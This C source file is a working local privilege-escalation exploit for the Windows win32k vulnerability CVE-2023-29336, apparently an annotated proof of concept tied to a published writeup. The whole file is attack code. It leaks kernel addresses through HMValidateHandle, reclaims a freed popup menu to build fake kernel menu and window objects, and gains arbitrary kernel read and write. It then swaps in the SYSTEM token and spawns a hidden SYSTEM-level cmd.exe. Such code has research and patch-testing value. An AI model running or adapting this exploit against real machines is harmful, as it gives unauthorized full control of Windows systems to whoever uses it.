// writeup link:  https://www.numencyber.com/cve-2023-29336-win32k-analysis/
// Portions of this code appears to be taken from https://github.com/leeqwind/HolicPOC/blob/58705c366b5acfe366cab5ad535a710775ba9897/windows/win32k/CVE-2017-0263/x86.cpp

#include <windows.h>
//windows server 2016 Datacenter update patch in May
#include <stdio.h>
#include <tchar.h>

#define SC_CLOSE 0xF060

// These can all be verified with https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2110%2021H2%20(November%202021%20Update)/_EPROCESS
//#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440 // For Windows 10/Windows Server 2016's EPROCESS structure.
//#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448 // For Windows 10/Windows Server 2016's EPROCESS structure.
//#define EPROCESS_TOKEN_OFFSET 0x4b8 // For Windows 10/Windows Server 2016's EPROCESS structure.

// Define some of the undocumented window messages, using http://pinvoke.net/default.aspx/Constants.WM as a reference.
// According to https://github.com/rossy/borderless-window/blob/master/borderless-window.c#LL449C6-L449C73 this message is used to draw themed window borders.
#define WM_NCUAHDRAWCAPTION 0xAE

// Define the outline for the various NtXXX related functions we will need to use for this exploit and initialize them as global variables.
typedef DWORD64(NTAPI* NtUserEnableMenuItem)(HMENU hMenu, UINT uIDEnableItem, UINT uEnable);
NtUserEnableMenuItem g_NtUserEnableMenuItem = NULL;


#ifdef _WIN64
typedef void* (NTAPI* lHMValidateHandle)(HANDLE h, int type);
#else
typedef void* (__fastcall* lHMValidateHandle)(HANDLE h, int type);
#endif

lHMValidateHandle pHmValidateHandle = NULL;
ULONGLONG addressToReadFrom = NULL;

// Declare the definition for the window callback function.
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

// Declare the function definition for the function which will be responsible
// for spawning our process as SYSTEM.
int spawn_shell();

// Define the structure for the shellcode area that we will be allocating later 
typedef struct _SHELLCODE {
    DWORD reserved;
    DWORD pid;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    BOOL  bExploited;
    BYTE  pfnWindProc[];
} SHELLCODE, * PSHELLCODE;


// Define the tagMENU structure as we will need to access some of its fields such as spwndNotify etc.
struct tagMENU
{
    ULONG64 field_0;
    ULONG64 field_8;
    ULONG64 field_10;
    ULONG64 field_18;
    ULONG64 field_20;
    PVOID obj28;
    DWORD field_30;
    DWORD flag1;
    DWORD flag2;
    DWORD cxMenu;
    DWORD cyMenu;
    ULONG64 spwndNotify; // + 0x48 /* window receiving the messages for ownerdraw */
    PVOID rgItems;       // + 0x50 /* Array of menu items */
    ULONG64 field_58; // + 0x58
    ULONG64 field_60;
    ULONG64 field_68;
    ULONG64 field_70;
    ULONG64 field_78;
    ULONG64 field_80;
    ULONG64 field_88;
    ULONG64 field_90;
    PVOID ref; // + 0x98
};

// Declare all of our global variables.
tagMENU* g_pFakeMenu = 0;
static PSHELLCODE pvShellCode = NULL;
HMENU hSystemMenu;
HMENU hSubMenu;
HMENU hMenuB;
PVOID MENU_add = 0;
DWORD flag_shown_window = 0;
HWND HWND_list[0x300];
HWND HWND_list1[0x20];
HMENU HMENUL_list[0x300];
int Hwnd_num = 0;
ULONGLONG HWND_add = 0;
ULONGLONG GS_off = 0;
WORD max = 0;
HMODULE hUser32 = NULL;

static PULONGLONG     ptagWNDFake = NULL;
static PULONGLONG     ptagWNDFake1 = NULL;
static PULONGLONG     ptagWNDFake2 = NULL;

static PULONGLONG     GS_handle = NULL;

static PULONGLONG     HWND_class = NULL;


static VOID GetHMValidateHandleAddress(VOID)
{
    HMODULE hUser32 = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hUser32, "IsMenu");
    ULONGLONG address = NULL;
    unsigned int uiHMValidateHandleOffset = 0;
    ULONGLONG offsetTrue = 0;
    for (INT i = 0; i < 0x90; i++)
    {
        if (*(BYTE*)(i + pfnIsMenu) == 0xE8)
        {
            uiHMValidateHandleOffset = i + 1;

            unsigned int offsetInCallInstruction = *(unsigned int*)(pfnIsMenu + uiHMValidateHandleOffset);
            offsetTrue = offsetInCallInstruction | 0xFFFFFFFF00000000;
            unsigned long long address = (unsigned long long)pfnIsMenu + uiHMValidateHandleOffset + offsetTrue;
            address += 4; // Add 4 to account for the 4 bytes of the offset value in memory.
            /*The + 11 is to skip the padding bytes as on Windows 10 these aren't nops
            address = (unsigned long long)hUser32 + offset + 11;*/
            pHmValidateHandle = (lHMValidateHandle)address;
            break;
        }
    }
}

VOID FindAddressToReplicateHMValidateHandleLeak() {
    if (pHmValidateHandle == NULL) {
        GetHMValidateHandleAddress();
    }

    unsigned int offsetIntoHMValidateHandle = 0;
    ULONGLONG offsetTrue = 0;
    ULONGLONG trueAddress = 0;
    // Now that we have the address of HMValidateHandle, lets go ahead and try to get the value of the
    // offset which changes between versions of USER32.dll.
    for (INT i = 0; i < 0x90; i++)
    {
        if ((*(BYTE*)(i + (ULONGLONG)pHmValidateHandle) == 0x48) && (*(BYTE*)(i + (ULONGLONG)pHmValidateHandle + 1) == 0x03))
        {
            offsetIntoHMValidateHandle = i + 3; // Skip over the first 3 bytes which are the opcode so that we can read the offset from RIP to the data segment we are interested in.
            unsigned int offsetInCallInstruction = *(unsigned int*)((ULONGLONG)pHmValidateHandle + offsetIntoHMValidateHandle);
            trueAddress = (ULONGLONG)pHmValidateHandle + offsetIntoHMValidateHandle + offsetInCallInstruction;
            trueAddress += 4; // Skip the 4 bytes from the offset part of the instruction.
            break;
        }
    }
    addressToReadFrom = trueAddress;
    return;
}

PVOID GetMenuHandle(HMENU menu_D)
{
    PVOID handle = 0;
    PBYTE add = 0;
    
    if (addressToReadFrom == NULL) {
        FindAddressToReplicateHMValidateHandleLeak();
    }

    // Initialize par1 and par2 to 0.
    ULONGLONG par1 = 0;
    DWORD par2 = 0;

    // Using the handle to user32.dll, add 0xbd688 to point to the second entry in the `gSharedInfo()` table? Best guess I have at this at the moment.
    memcpy((VOID*)&par1, (char*)(addressToReadFrom), 0x08);
    memcpy((VOID*)&par2, (char*)(addressToReadFrom + 0x08), 0x02); // This ends up being the same as the 0x18 we add to par1 so I'm not sure this is needed as par2 is never used.

    add = (PBYTE)(par1 + 0x18 * (WORD)menu_D);

    if (add)
    {
        handle = *(PVOID*)add;
    }
    else
    {
        handle = 0;
    }
    handle = (PVOID*)((ULONGLONG)handle - GS_off + 0x20);
    return *(PVOID*)handle;
}

PVOID xxGetHMValidateHandle(HMENU menu_D, DWORD type_handle)
{
    PVOID HANDLE = 0;
    PBYTE add = 0;
    WORD temp = 0;
    
    if (addressToReadFrom == NULL) {
        FindAddressToReplicateHMValidateHandleLeak();
    }

    ULONGLONG par1 = 0;
    DWORD par2 = 0;
    memcpy((VOID*)&par1, (char*)(addressToReadFrom), 0x08);
    memcpy((VOID*)&par2, (char*)(addressToReadFrom + 0x08), 0x02);

    temp = (ULONGLONG)menu_D >> 16;
    add = (PBYTE)(par1 + 0x18 * (WORD)menu_D);
    if (add)
    {
        HANDLE = *(PVOID*)add;
    }
    else
    {
        HANDLE = 0;
    }
    HANDLE = (PVOID*)((ULONGLONG)HANDLE - GS_off + 0x20);
    return *(PVOID*)HANDLE;
}


// Try fill in the hole where hSubMenu was with our own WNDCLASSEXW element.
static VOID xxReallocPopupMenu(VOID)
{
    // Try 16 times to fill in the hole.
    for (INT i = 0; i < 0x8; i++)
    {
        WNDCLASSEXW Class = { 0 };
        WCHAR       szTemp[0x100] = { 0 };

        // Use filler bytes to try make this object the same size as the popup menu we are replacing.
        wsprintfW(szTemp, L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@A%d", i); 
        Class.cbSize = sizeof(WNDCLASSEXA);
        Class.lpfnWndProc = DefWindowProcW;
        Class.cbWndExtra = 0;
        Class.hInstance = GetModuleHandleA(NULL);
        Class.lpszMenuName = NULL;
        Class.lpszClassName = szTemp;

        // Call RegisterClassExW so we allocate the object class in memory and hopefully fill in the hole.
        if (!RegisterClassExW(&Class))
        {
            continue; // If we fail then just continue, it might be a temporary failure or we might have filled in 
                      // all the holes, but for saftey's sake keep trying to fill in the holes.
        }
    }
}

VOID createclass(VOID)
{
    WCHAR   szTemp[0x100] = { 0 };
    for (INT i = 9; i < 29; i++)
    {
        WNDCLASSEXW Class = { 0 };

        wsprintfW(szTemp, L"A@A%d", i);
        Class.cbSize = sizeof(WNDCLASSEXA);
        Class.lpfnWndProc = DefWindowProcW;
        Class.cbWndExtra = 0x20;
        Class.hInstance = GetModuleHandleA(NULL);
        Class.lpszMenuName = NULL;
        Class.lpszClassName = szTemp;
        Class.cbClsExtra = 0x1a0;
        if (!RegisterClassExW(&Class))
        {
            continue;
        }
    }

    for (INT i = 9; i < 29; i++)
    {
        wsprintfW(szTemp, L"A@A%d", i);
        HWND_list1[i] = CreateWindowEx(NULL, szTemp, NULL, WS_VISIBLE, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    }
}

// Use GetMenuBarInfo() to form an arbitrary read of 64 bytes.
ULONG64 Read64(ULONG64 address)
{
    // First initialize a MENUBARINFO structure and correctly declare its size.
    MENUBARINFO mbi = { 0 };
    mbi.cbSize = sizeof(MENUBARINFO);

    // Set up the g_pFakeMenu's rgItems to point to the address to read minus 0x48 which appears 
    // to be related to spwndNotify being offset 0x48 into the tagMENU structure that g_pFakeMenu is a type of???
    // Not entirely sure how this works but it seems possibly related to this?
    g_pFakeMenu->rgItems = PVOID(address - 0x48);
    GetMenuBarInfo(HWND_list[max + 1], OBJID_MENU, 1, &mbi); // Send the handle HWND_list[max+1], get the menu bar associated with the window, get information about the first item in the menu bar, and save the information to mbi.

    // Do some adjustments to get the true value of the address as the leaked information will be in the rcBar field which is 
    // of type tagRECT, which has a top, left, right, and bottom field. The left field will be the bottom 32 bits, whilst the 
    // top field will be the upper 32 bits and will need to be left shifted 32 bits accordingly to form the full 64 bit long address.
    // Note: This is 64 bit specific, calculation would probably need to be 16 bit shift or similar for a 32 bit system.
    return (unsigned int)mbi.rcBar.left + ((ULONGLONG)mbi.rcBar.top << 32); 
}

void exploit()
{
    for (int i = 0; i < 0x20; i++)
    {
        ULONG64 pmenu = SetClassLongPtr(HWND_list1[i], 0x270, (LONG_PTR)g_pFakeMenu);
        if (pmenu != 0)
        {
            Hwnd_num = i;
            MENUBARINFO mbi = { 0 };
            mbi.cbSize = sizeof(MENUBARINFO);
        }
    }

    // Token stealing
    ULONG64 p = Read64(HWND_add + 0x250 + 0x10); // USER_THREADINFO 
    p = Read64(p);            //THREADINFO
    p = Read64(p + 0x220);         // (PROCESSINFO)         

    ULONG64 eprocess = p;
    printf("Current EPROCESS = %llx\n", eprocess);
    p = Read64(p + 0x2f0);

    do {
        p = Read64(p + 0x08);
        ULONG64 pid = Read64(p - 0x08);
        if (pid == 4) {
            ULONG64 pSystemToken = Read64(p + 0x68);
            printf("pSys/tem Token = %llx \n", pSystemToken);

            HWND_class = (PULONGLONG)((PBYTE)0x303000);
            HWND_class[8] = eprocess + 0x290;
            HWND_class[12] = 0x100;
            HWND_class[20] = 0x303010;

            ULONG64 ret_add = SetClassLongPtr(HWND_list1[Hwnd_num], 0x250 + 0x98 - 0xa0, (LONG_PTR)HWND_class);
            SetClassLongPtr(HWND_list[max + 1], 0x28, pSystemToken);
            ret_add = SetClassLongPtr(HWND_list1[Hwnd_num], 0x250 + 0x98 - 0xa0, (LONG_PTR)ret_add);

            break;
        }
    } while (p != eprocess);
    spawn_shell();
}


void buildmem()
{
    // Build a memory structure at address 0x300000 of size 0x10000 with RWX permissions, then zero its memory out.
    WORD max_handle = 0;
    pvShellCode = (PSHELLCODE)VirtualAlloc((PVOID)0x300000, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pvShellCode == NULL)
    {
        return;
    }
    ZeroMemory(pvShellCode, 0x10000);



    ptagWNDFake = (PULONGLONG)((PBYTE)0x304140);
    ptagWNDFake[0] = (ULONGLONG)0x304140;

    ptagWNDFake[2] = (ULONGLONG)0x304140 + 0x10;



    ptagWNDFake[6] = (ULONGLONG)0x304140;
    ptagWNDFake[8] = 0x305300;

    ptagWNDFake[11] = (ULONGLONG)MENU_add;
    ptagWNDFake[68] = (ULONGLONG)0x304140 + 0x230;
    ptagWNDFake[69] = (ULONGLONG)0x304140 + 0x28;
    ptagWNDFake[70] = (ULONGLONG)0x304140 + 0x30;
    ptagWNDFake[71] = (ULONGLONG)0x000004;


    ptagWNDFake1 = (PULONGLONG)((PBYTE)0x305300);
    ptagWNDFake1[1] = (ULONGLONG)0x11;
    ptagWNDFake1[2] = (ULONGLONG)0x305320;
    ptagWNDFake1[6] = (ULONGLONG)0x1000000000020000;
    ptagWNDFake1[8] = (ULONGLONG)0x00000000029d0000;
    ptagWNDFake1[11] = (ULONGLONG)HWND_add + 0x63 - 0x120;


    ptagWNDFake1[14] = (ULONGLONG)0x306500;
    ptagWNDFake1[16] = (ULONGLONG)305400;


    ptagWNDFake2 = (PULONGLONG)((PBYTE)0x306500);
    ptagWNDFake1[11] = (ULONGLONG)0x306600;



    WNDCLASSEX WndClass = { 0 };
    WndClass.cbSize = sizeof(WNDCLASSEX);
    WndClass.lpfnWndProc = DefWindowProc;
    WndClass.style = CS_VREDRAW | CS_HREDRAW;
    WndClass.cbWndExtra = 0xe0;
    WndClass.hInstance = NULL;
    WndClass.lpszMenuName = NULL;
    WndClass.lpszClassName = L"NormalClass";

    RegisterClassEx(&WndClass);

    for (int i = 0; i < 0x200; i++)
    {
        HMENUL_list[i] = CreateMenu();
    }
    for (int i = 0; i < 0x100; i++)
    {
        HWND_list[i] = CreateWindowEx(NULL, L"NormalClass", NULL, WS_VISIBLE, 0, 0, 0, 0, NULL, HMENUL_list[i], NULL, NULL);

    }
    for (int i = 0; i < 0x100; i++)
    {
        SetWindowLongPtr(HWND_list[i], 0x58, (LONG_PTR)0x0002080000000000);
        SetWindowLongPtr(HWND_list[i], 0x80, (LONG_PTR)0x0000303030000000);
    }

    // Start at 0x20 to skip the first few entries that will likely be filling in various holes in memory.
    for (int i = 0x20; i < 0x60; i++)
    {
        // Check that the offset between the middle and 1st HWND element is 0x250 as we need three consecuitive menues each 0x250 bytes long.
        if ((ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2], 0x01) - (ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2 - 1], 0x01) == 0x250)
        {
            // If this is the case, then check that the offset between the 3rd and last HWND element and the middle aka 2nd HWND element is 0x250.
            if ((ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2 + 1], 0x01) - (ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2], 0x01) == 0x250)
            {
                // If that all works out, then save the address of the 2nd HWND element into HWND_add for safe keeping.
                HWND_add = (ULONGLONG)xxGetHMValidateHandle((HMENU)HWND_list[i * 2], 0x01);

                // Set max to the offset of the 2nd element into HWND_list, then break out of the loop as we found our element.
                max = i * 2;
                break;
            }
        }
        if (i == 0x5f)
        {
            // If i is 0x5f then we reached the end of the list so we couldn't find an appropriate setup so set HWND_add to 0, aka invalid?
            // Seems like this should be throwing an exception and then quitting so not sure if this is appropriate?
            HWND_add = 0;
        }

    }

    ptagWNDFake1[11] = (ULONGLONG)HWND_add + 0x63 - 0x120;
    DestroyWindow(HWND_list[max]);
    createclass();

    // Create a fake spmenu
    PVOID hHeap = (PVOID)0x302000;
    g_pFakeMenu = (tagMENU*)(PVOID)0x302000;
    g_pFakeMenu->ref = (PVOID)0x302300;
    *(PULONG64)g_pFakeMenu->ref = (ULONG64)g_pFakeMenu;
    // cItems = 1
    g_pFakeMenu->obj28 = (PVOID)0x302200;
    *(PULONG64)((PBYTE)g_pFakeMenu->obj28 + 0x2C) = 1;
    // rgItems
    g_pFakeMenu->rgItems = (PVOID)0x304000;
    // cx / cy must > 0
    g_pFakeMenu->flag1 = 1;
    g_pFakeMenu->flag2 = 1;
    g_pFakeMenu->cxMenu = 1;
    g_pFakeMenu->cyMenu = 1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Set gsValue to 0 and then make shellcode that will execute "mov rax, QWORD PTR gs:0x30", aka the address of TEB, followed by a bunch of NOPs and then a RET instruction.
    ULONGLONG gsValue = 0;
    unsigned char shellcode[] = "\x65\x48\x8B\x04\x25\x30\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc3";

    // Create the executable memory somewhere in memory and copy the shellcode over into it with READ, WRITE, and EXECUTE permissions.
    LPVOID executableMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (executableMemory == NULL) {
        return 1;
    }
    memcpy(executableMemory, shellcode, sizeof(shellcode));

    gsValue = ((ULONGLONG(*)())executableMemory)(); // Use the shellcode to get the address of the TEB, aka gs[0x30].
    gsValue = gsValue + 0x800; // If I'm not mistaken, this is ULONGLONG Win32ClientInfo[62]; according to both
                               // https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2110%2021H2%20(November%202021%20Update)/_TEB64
                               // and also https://raw.githubusercontent.com/MortenSchenk/tagWnd-Hardening-Bypass/master/DesktopHeap.pdf
                               // 
                               // This appears to be replicating code inside of HMValidateHandle, which amazingly seems to be the same on Windows 11 x64 as it is on Windows 10 x64 minus the 0xbd688 offset.
    GS_handle = (PULONGLONG)(PBYTE)gsValue;
    GS_off = GS_handle[5]; 
                           // I think this might be grabbing ulClientDelta according to https://raw.githubusercontent.com/MortenSchenk/tagWnd-Hardening-Bypass/master/DesktopHeap.pdf
                           // and also https://fuzzysecurity.com/tutorials/expDev/22.html. This will get the base address of the user mode desktop heap.
     
    // Create a 0xb8 long string and fill up 0xa8 of it with A's leaving the last 0x10 or 16 bytes as blank strings.
    char str[0xb8] = "";
    memset(str, 0x41, 0xa8);

    // Initialize all of the global pointers to the internal NtXXX functions.
    g_NtUserEnableMenuItem = (NtUserEnableMenuItem)GetProcAddress(GetModuleHandleA("win32u.dll"), "NtUserEnableMenuItem");


    // Create a new Window class structure and then set its windows proceedure to our window proceedure, 
    // set the hInstance to the instance that contains the Window Procedure for the class, and  
    // then set the class name to EnableMenuItem, and register that class with the system using RegisterClass.
    WNDCLASS wc = { 0 };

    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = TEXT("EnableMenuItem");

    RegisterClass(&wc);

    // Next create a Window using the class name of the Window class, the window name set to the same as that of the Window Class, using an 
    HWND hWnd = CreateWindow(
        wc.lpszClassName,
        TEXT("EnableMenuItem"),
        WS_OVERLAPPEDWINDOW, // This is an top level window with a title bar, border, and client area. It can also have a window menu, minimize and maximize buttons, and scroll bars.
                            // This is described at https://learn.microsoft.com/en-us/windows/win32/winmsg/window-features#overlapped-windows.
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        400, 300, // Create this window to be 400 by 300 in size.
        NULL, // Don't have any parent windows.
        NULL, // Don't have a handle to a menu or child-window identifier.
        hInstance, // Point to the correct instance of the module to be associated with the Window.
        NULL // Don't pass any value to the window.
    );

    if (!hWnd) return FALSE; // Return FALSE if the window could not be created.

    // Get a handle to a copy of the window menu, also known as the system menu or control
    // menu, currently in use. This can then be used for copying and modifying.
    hSystemMenu = GetSystemMenu(hWnd, FALSE);

    // Next create a normal popup menu and save its handle into hSubMenu.
    hSubMenu = CreatePopupMenu();

    // Leak the address of where hSubMenu is using leaked base address of the User Land Heap in kernel memory.
    MENU_add = GetMenuHandle(hSubMenu);

    // Create a new menu and save its handle into hMenuB.
    hMenuB = CreateMenu();

    // Build out the memory for the exploit. XXXX NOT REALLY SURE WHAT IS GOING ON HERE XXXX
    buildmem();

    if (HWND_add == 0)
    {
        return 0;
    }

    // Append two other menus to hSubMenu. Not sure what 0x2061 is, however 0xF060 is the X box for the menu so people can close it.
    AppendMenu(hSubMenu, MF_STRING, 0x2061, TEXT("0"));
    AppendMenu(hSubMenu, MF_STRING, SC_CLOSE, TEXT("1"));

    // Send the system menu a message to delete its close menu.
    DeleteMenu(hSystemMenu, SC_CLOSE, MF_BYCOMMAND);

    // Take the hMenuB menu and append hSubMenu to it as a popup menu, then name it Menu A.
    AppendMenu(hMenuB, MF_POPUP, (UINT_PTR)hSubMenu, L"Menu A");

    // Take the hSystemMenu and append hMenuB to it as a popup menu, then name it Menu B.
    AppendMenu(hSystemMenu, MF_POPUP, (UINT_PTR)hMenuB, L"Menu B");


    // At this point have:   hWnd <- hSystemMenu <- hMenuB <- hSubMenu


    // Now show the main window aka hWnd, and also call UpdateWindow to update 
    // the client area of the hWnd window.
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    // Set flag_shown_window to 1 to notify the rest of the exploit process now that the main window aka hWnd is shown.
    flag_shown_window = 1;

    // Call NtUserEnableMenuItem with SC_CLOSE and the MF_GREYED flag set to set the SC_CLOSE menu item to be disabled or greyed.
    g_NtUserEnableMenuItem(hSystemMenu, SC_CLOSE, MF_GRAYED);

    // Start the exploit, and leak the eprocess token, then spawn the shell.
    exploit();

    MSG msg = { 0 };

    // Keep retrieving a message from the calling thread's message queue, then translate 
    // and dispatch them continuously until WM_QUIT is sent as a window message.
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Set the return code to the first parameter that would be sent to the window. 
    // This is done in the event the function succeeds on a WM_QUIT message as noted at https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winmain
    return (int)msg.wParam;
}


// This is the Window Callback Procedure. It processes messages sent to a Window.
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_DESTROY:
        PostQuitMessage(0); // Let the rest of the system that a thread has made a request to quit.
        return 0; // Exit the process.
    case WM_NCUAHDRAWCAPTION:
        switch (wParam)
        {
            case 0x1000:
                if (flag_shown_window) // Check if the main window aka hWnd is shown yet and do nothing if not. 
                {
                    // The layout is  hWnd <- hSystemMenu <- hMenuB <- hSubMenu    and now we are getting the number of items in the menu hMenuB.
                    int itemCount = GetMenuItemCount(hMenuB);

                    // Go through each item in the menu and remove it minus the first one, using positional arguments to denote which menu to delete.
                    for (int i = itemCount - 1; i >= 0; i--) {
                        RemoveMenu(hMenuB, i, MF_BYPOSITION);
                    }
                    DestroyMenu(hSubMenu); // Destroy the popup menu hSubMenu
                    xxReallocPopupMenu(); // Try allocate a WNDCLASSEXW object to replace hSubMenu.
                }
            case 0x1001:
                if (flag_shown_window) // Check if the main window aka hWnd is shown yet and only return 0 if not. 
                {

                    // The layout is  hWnd <- hSystemMenu <- hMenuB <- hSubMenu    and now we are getting the number of items in the menu hMenuB.
                    int itemCount = GetMenuItemCount(hMenuB);

                    // Go through each item in the menu and remove it minus the first one, using positional arguments to denote which menu to delete.
                    for (int i = itemCount - 1; i >= 0; i--) {
                        RemoveMenu(hMenuB, i, MF_BYPOSITION);
                    }

                    DestroyMenu(hSubMenu); // Destroy the popup menu hSubMenu
                    xxReallocPopupMenu(); // Try allocate a WNDCLASSEXW object to replace hSubMenu.
                }
            return 0;
        }
        break;
    }
    return DefWindowProc(hWnd, message, wParam, lParam);
}


// This function is responsible for spawning the cmd.exe process as SYSTEM.
int spawn_shell()
{
    // Declare all of the necessary variables.
    SECURITY_ATTRIBUTES     sa;
    HANDLE                  hRead, hWrite;
    byte                    buf[40960] = { 0 };
    STARTUPINFOW            si;
    PROCESS_INFORMATION     pi;

    // Zero out the various attributes to ensure their fields
    // are properly initialized to 0.
    RtlSecureZeroMemory(&si, sizeof(si));
    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&sa, sizeof(sa));

    // Initialize the security attribute structure appropriately.
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    // Try to create an anonymous pipe, using hRead as the handle for the read end and 
    // hWrite as handle for the the write end, and using sa as the security attributes 
    // for the pipe. Specify the nSize parameter as 0, aka ask the system to use the default buffer size. 
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        return -3;
    }

    // Initialize the size of the STARTUPINFO structure, and then fill in its various elements.
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfoW(&si);
    si.hStdError = hWrite; // Make sure the standard error points to the pipe's write handle.
    si.hStdOutput = hWrite; // Make sure the standard output points to the pipe's write handle.
    si.wShowWindow = SW_HIDE; // Make sure to hide the cmd.exe console window.
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default"; // Set it to use the default desktop for GUIs aka the same desktop that the user launching this exploit will have access to.
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Specify that wShowWindow contains additional information and that we want to use the STD handles for input and output control.
    wchar_t cmd[4096] = { L"cmd.exe" };

    // Create a new process with no application name, the command string specified in "cmd",
    // no process or security attributes, with handles inherited from the parent process,
    // with dwCreationFlags set to 0, aka NORMAL_PRIORITY_CLASS and the process inherits the
    // error mode of the caller and the parent's console. Also sets lpEnvironment to NULL so we
    // don't have to specify an environment block and specifies NULL for the current directory so
    // that it will ahve the same current drive and directory as the calling process.
    // 
    // Finally specify the startup info and process info blocks so that we know how to start up the process,
    // and so that we can save the process information into the process block for later retrieval.
    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        // If CreateProcessW fails, close the various handles and also print an error before failing.
        CloseHandle(hWrite);
        CloseHandle(hRead);
        printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
        return -2;
    }

    // If it succeeds, then close the "hWrite" handle that corresponds to stdError and stdOutput.
    CloseHandle(hWrite);
    return 0;
}